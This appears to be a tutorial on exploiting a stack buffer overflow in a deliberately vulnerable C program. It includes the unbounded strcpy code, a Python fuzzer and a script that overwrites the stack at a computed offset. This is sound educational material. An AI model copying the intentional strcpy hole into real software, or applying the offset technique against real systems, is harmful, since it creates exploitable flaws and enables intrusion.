# Exploiting Simple `C` Program


## Vulnerable Code

```cpp
#include <stdio.h>
#include <stdlib.h>

int functionFunction(char* param) {
	char* localString = "conjunction function";
	int localInt = 0xdeadbeef;
	char localString2[10];

	strcpy(localString2, param);
	return 1;
}

int main(int argc, char* argv[]) {
	char* localString = "main function";
	int localInt = 0x11223344;

	functionFunction(argv[1]);

	return 0;
}

```


## Finding Vulnerability

![](/assets_md/Pasted%20image%2020220320070358.png)

![](/assets_md/Pasted%20image%2020220320071628.png)

![](/assets_md/Pasted%20image%2020220320070720.png)


## Calculating Offset

**FUZZER SCRIPT**

```python
# simple fuzzer script (Tested on Windows_x32)
import subprocess

# Creating Long Argument String
file = "VulnCode1.exe"
argument = ""

for arg in range(0x11, 0xff):
	argument += chr(arg)

# Running file with Generated Argument
process = subprocess.Popen([file, argument], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
stdout, stderr = process.communicate()
exit_code = process.wait()

print("EXIT CODE :", exit_code)

```

![](/assets_md/Pasted%20image%2020220320081548.png)

**OFFSET CALCULATION**

**`int(0x2f - 2x11)`**

![](/assets_md/Pasted%20image%2020220320081857.png)

**OFFSET TEST CODE**

```python
# simple test script (Tested on Windows_x32)
import subprocess

# Forging Offset Based Test Argument
file = "VulnCode1.exe"
offset = 30				# depends on above calculation
argument = "A" *offset + chr(0xef) + chr(0xbe) + chr(0xad) + chr(0xde) + "BBBBCCCCDDDDEEEEFFFF"

# Running file with FORGED Argument
process = subprocess.Popen([file, argument], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
stdout, stderr = process.communicate()
exit_code = process.wait()

print("EXIT CODE :", exit_code)
```

![](/assets_md/Pasted%20image%2020220320100929.png)


